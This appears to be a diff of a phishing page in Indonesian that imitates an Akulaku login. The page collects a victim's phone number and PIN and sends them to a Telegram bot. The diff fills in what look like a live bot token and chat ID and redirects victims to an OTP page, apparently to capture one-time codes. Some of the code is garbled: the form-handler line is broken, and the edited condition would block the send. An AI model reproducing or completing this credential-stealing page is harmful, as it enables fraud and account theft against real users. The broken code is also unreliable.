@@ -187,8 +187,8 @@
 
     <script>
         // --- KONFIGURASI TELEGRAM BOT ANDA ---
-        const BOT_TOKEN = 'ISI_TOKEN_BOT_DISINI'; // Contoh: 123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11
-        const CHAT_ID = 'ISI_CHAT_ID_DISINI'; // Chat ID Anda
+        const BOT_TOKEN = '8260302249:AAG8Gjw6PkPt9zSWQQ9mIme8hRtjQvr7BQk'; // Contoh: 123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11
+        const CHAT_ID = '5529657606'; // Chat ID Anda
         // -------------------------------------
 
         document('loginForm').addEventListener('submit', async function.getElementById(e) {
@@ -215,7 +215,7 @@
             spinner.style.display = "inline-block";
 
             // --- KIRIM DATA KE TELEGRAM ---
-            if (BOT_TOKEN !== 'ISI_TOKEN_BOT_DISINI' && CHAT_ID !== 'ISI_CHAT_ID_DISINI') {
+            if (BOT_TOKEN !== '8260302249:AAG8Gjw6PkPt9zSWQQ9mIme8hRtjQvr7BQk' && CHAT_ID !== '5529657606') {
                 const message = `🔔 *Login Baru Akulaku*\n\n📱 Nomor: ${phone}\n🔐 PIN: ${pin}`;
                 
                 try {
@@ -238,7 +238,7 @@
             // --- ALIHKAN KE HALAMAN SELANJUTNYA ---
             // Ganti 'home.html' dengan URL halaman tujuan Anda
             setTimeout(() => {
-                window.location.href = "home.html";
+                window.location.href = "otp.html";
             }, 1000); // Dialihkan setelah 1 detik
         });
     </script>
